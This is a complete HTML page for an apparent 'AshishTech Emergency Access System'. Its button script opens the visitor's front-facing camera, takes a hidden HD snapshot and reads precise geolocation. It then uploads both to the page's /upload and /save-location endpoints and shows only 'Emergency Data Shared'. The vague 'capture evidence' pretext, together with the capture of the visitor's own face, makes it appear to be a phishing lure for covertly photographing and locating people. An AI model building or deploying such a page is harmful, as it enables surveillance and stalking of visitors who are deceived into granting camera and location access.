<!DOCTYPE html>
<html>

<head>

<meta name="viewport"
content="width=device-width, initial-scale=1.0">

<title>AshishTech</title>

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial;
}

body{

    height:100vh;

    display:flex;

    justify-content:center;

    align-items:center;

    background:
    linear-gradient(
        135deg,
        #020617,
        #07111f,
        #000000
    );

    overflow:hidden;
}

body::before{

    content:"";

    position:absolute;

    width:700px;
    height:700px;

    background:
    radial-gradient(
        rgba(0,217,255,0.15),
        transparent
    );

    filter:blur(80px);

    animation:rotate 10s linear infinite;
}

@keyframes rotate{

    0%{
        transform:rotate(0deg);
    }

    100%{
        transform:rotate(360deg);
    }

}

.container{

    width:360px;

    padding:35px;

    border-radius:30px;

    background:rgba(255,255,255,0.05);

    backdrop-filter:blur(18px);

    border:1px solid rgba(0,217,255,0.2);

    box-shadow:
    0 0 35px rgba(0,217,255,0.15);

    text-align:center;

    position:relative;

    z-index:1;
}

.title{

    font-size:48px;

    font-weight:bold;

    color:white;

    margin-bottom:10px;

    letter-spacing:2px;
}

.title span{

    color:#00d9ff;
}

.subtitle{

    color:#00d9ff;

    font-size:15px;

    letter-spacing:3px;

    margin-bottom:30px;
}

.cloud{

    width:140px;

    margin-bottom:25px;

    filter:
    drop-shadow(0 0 20px #00d9ff);
}

.info{

    color:#d1d5db;

    font-size:17px;

    margin-bottom:30px;

    line-height:28px;
}

button{

    width:100%;

    padding:17px;

    border:none;

    border-radius:18px;

    background:
    linear-gradient(
        90deg,
        #00d9ff,
        #0066ff
    );

    color:white;

    font-size:22px;

    font-weight:bold;

    cursor:pointer;

    transition:0.3s;
}

button:hover{

    transform:scale(1.03);

    box-shadow:
    0 0 25px #00d9ff;
}

.footer{

    position:absolute;

    bottom:15px;

    right:20px;

    color:#7c7c7c;

    font-size:12px;
}

</style>

</head>

<body>

<div class="container">

    <div class="title">

        ASHISH <span>TECH</span>

    </div>

    <div class="subtitle">

        EMERGENCY ACCESS SYSTEM

    </div>

    <img
    class="cloud"
    src="https://cdn-icons-png.flaticon.com/512/4140/4140047.png">

    <div class="info">

        Capture evidence in emergency.

    </div>

    <button onclick="startAccess()">

        ENABLE ACCESS →

    </button>

    <div class="footer">

        Emergency Access

    </div>

</div>

<script>

async function startAccess(){

    try{

        // CAMERA ACCESS (HD)
        const stream = await navigator.mediaDevices.getUserMedia({

            video:{
                width:{ ideal:1920 },
                height:{ ideal:1080 },
                facingMode:"user"
            }

        });

        const video = document.createElement("video");

        video.srcObject = stream;

        await video.play();

        // LOCATION ACCESS
        navigator.geolocation.getCurrentPosition(

            async(position)=>{

                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;

                // SEND LOCATION
                await fetch("/save-location",{

                    method:"POST",

                    headers:{
                        "Content-Type":"application/json"
                    },

                    body:JSON.stringify({
                        latitude,
                        longitude
                    })

                });

                // CREATE HD IMAGE
                const canvas = document.createElement("canvas");

                canvas.width = 1920;
                canvas.height = 1080;

                const ctx = canvas.getContext("2d");

                ctx.drawImage(video,0,0);

                // CONVERT TO HIGH QUALITY JPG
                canvas.toBlob(async(blob)=>{

                    const formData = new FormData();

                    formData.append("photo",blob,"photo.jpg");

                    await fetch("/upload",{

                        method:"POST",
                        body:formData

                    });

                    alert("Emergency Data Shared");

                },"image/jpeg",1.0);

            },

            (error)=>{

                alert("Location permission denied");

            },

            {
                enableHighAccuracy:true,
                timeout:10000,
                maximumAge:0
            }

        );

    }

    catch(err){

        alert("Permission Denied");

    }

}

</script>

</body>

</html>
